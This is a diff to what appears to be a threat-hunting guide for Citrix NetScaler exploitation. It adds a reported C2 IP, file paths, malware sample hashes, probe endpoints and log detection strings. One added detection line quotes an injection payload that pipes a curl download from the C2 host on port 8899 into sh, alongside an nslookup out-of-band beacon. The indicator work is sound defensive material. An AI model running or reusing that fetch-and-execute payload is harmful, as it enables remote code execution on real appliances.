@@ -18,6 +18,7 @@ The source labels in this file refer to the public reporting below.
 - eSentire TRU: https://www.esentire.com/blog/more-shells-than-a-seafood-buffet-tracking-citrix-netscaler-exploitation-activities-cve-2026-88771
 - Nextron Systems: https://www.nextron-systems.com/2026/10/06/update-on-citrix-netscaler-cve-2026-88771-and-cve-2026-88772-expanded-thor-detection-coverage/
 - Fortra Emerging Threats: https://www.fortra.com/security/emerging-threats/netscaler-cve-2026-88771-improper-input-validation-and-cve-2026-88772
+- SOCRadar NetScaler C2: https://socradar.io/blog/netscaler-c2-cve-2026-88771-exploitation/
 - Beazley Security Labs BSL-A1216: https://labs.beazley.security/advisories/BSL-A1216
 - PitScaler public briefing / IOC compilation: https://pitscaler.com/
 - PitScaler public IOC table: https://pitscaler.com/netscaler-iocs/
@@ -121,9 +122,12 @@ Sources:
 158.94.209.12
 68.178.160.183
 5.188.206.226
+45.143.130.195
 ```
 
 `81.94.239.8` is reported by PitScaler/Poppelgaard as a config/private-key exfiltration receiver on TCP/8877. `138.199.60.5` is reported as a CVE-2026-88779 SAML crash-payload source. `194.26.29.88` is a Corelight/Poppelgaard reverse-shell host; `138.199.200.90` is an exfiltration destination from the PitScaler/Poppelgaard public IOC set. Treat these as hunting pivots and validate direction, timing, and appliance role before acting.
+
+`45.143.130.195` is reported by SOCRadar as NetScaler C2 infrastructure using HTTP on TCP/8899 and DNS on UDP/TCP/53.
 
 ## Domain Indicators
 
@@ -220,6 +224,7 @@ Sources:
 /lula
 /vpn/c
 /epa/scripts/linux/nsepa.deb
+/tmp/.nsagent
 /var/tmp/.nsmon/nsmon.pl
 /var/tmp/.nsmon/.cfg
 /var/tmp/.nsmon/.state
@@ -285,6 +290,24 @@ c98aee75c5e199c9b5527984ce48675d665963f7cab8ce9f2e82465de6b58727
 
 ed082f744f035035900f67edf438f2f7d0528ac501234f63d476d65273cdb9a1
   Rapid7 / PitScaler - .ctxs.receiver web shell sample
+
+8588d11874ab52a1637953dc5538984647023d00b529f695fbd0e40cf8e5e852
+  SOCRadar - NetScaler C2 run.sh
+
+4992f575f3f1fc448cf54a4a0ce13cf6548790777abe0af1f935663498ea5639
+  SOCRadar - NetScaler C2 targets.py
+
+69a34c591eaaa2cbecaeed10c303b8dcf04c846b8408491da5452b9cfc93f686
+  SOCRadar - NetScaler C2 probe.py
+
+a3e26053975daa0a12a4848ce9533e5c439617cd7f69851347be2061999b4cd4
+  SOCRadar - NetScaler C2 exploit.py
+
+a9142989d912098856e58f2c74c2266e39150d50bc59722f915dade1ddfddf4a
+  SOCRadar - NetScaler C2 c2_server.py
+
+f9e06d412dee96d98db4d4588f0012af859cc11caaae3e130697f282447cf07f
+  SOCRadar - NetScaler C2 pollctl.py
 ```
 
 Hash hunting is deliberately limited to plausible payload/configuration file types and selected high-risk paths so that the tool does not hash an entire large appliance image unless necessary.
@@ -323,6 +346,7 @@ Examples include:
 - `pitboss PPE unexpectedly died NSPPE`
 - `pitboss PPE missed too many heartbeats NSPPE`
 - Elastic-style generic `pitboss` / packet-engine records containing shell metacharacters or URL-encoded shell syntax
+- SOCRadar NetScaler C2 injection strings such as `pitboss NSPPE-00;`, `curl${IFS}-sk${IFS}45.143.130.195:8899/s/<bid>|sh`, `nslookup${IFS}<bid>.p1.oob.45.143.130.195`, `/s/<bid>|sh`, and `;# unexpectedly died`
 - `NSPPE-00` malformed token variants
 - `NOT restarting NSPPE`
 - `orphan rings`
@@ -357,6 +381,7 @@ Examples include:
 - `/vpn/js/rdx/core/lang/rdx_en.json.gz`
 - `/logon/LogonPoint/tmindex.html`
 - `/nf/auth/doAuthentication.do`
+- `/nitro/v1/config/login`, `/nitro/v1/config/login?action=login`, `/nf/auth/getAuthenticationRequirements.do`, `/vpn/index.html`, and `/logon/LogonPoint/index.html`
 - `/epa/scripts/linux/nsepa.deb`
 - `vp_probe_nonexist`
 - `/saml/login`
@@ -385,6 +410,7 @@ Examples include:
 - second-wave fetch/callback pivots involving `/v`, `f.pylrk.cc`, `webhook.site`, and `dnshook.site`
 - TENEX/Poppelgaard Platypus pivots involving `/var/core/.ns-cache`, `client.crt`, `client.key`, `/netscaler.local/ns_*.pl`, and replaced `/var/python/bin/customsnmpd`
 - Corelight/PitScaler/Poppelgaard pivots involving `194.26.29.88`, `138.199.200.90`, `echvista.com`, `gsocket.io`, `nsepa.deb`, and `vp_probe_nonexist`
+- SOCRadar NetScaler C2 pivots involving `45.143.130.195`, `/tmp/.nsagent`, `/s/<bid>`, `/a/<bid>`, `/p/<bid>?h=<hex_hostname>&u=<hex_username>&src=agent`, `/c/<bid>`, and `/r/<bid>?d=<hex>`
 - exploit marker/output files such as `nx_verify.html`, `id009.txt`, `rce.txt`, `/tmp/watchTowr`, `/var/tmp/wtw*`, `/var/tmp/boom`, and small files containing `uid=0(root)`
 - Sliver delivery pivots involving `/HaKi2ufpiQ8AeVTZ/host`, `citrix3.bad`, and `IMPLANT_CAPABILITY_TUNNEL_TERMINAL_V1`
 - eSentire cluster pivots including `nsgtrust.deb`, `entretiensol.com`, Platypus enrollment paths, `platypus-agent/public-ip-probe`, and `application/x-protobuf-platypus-v2`
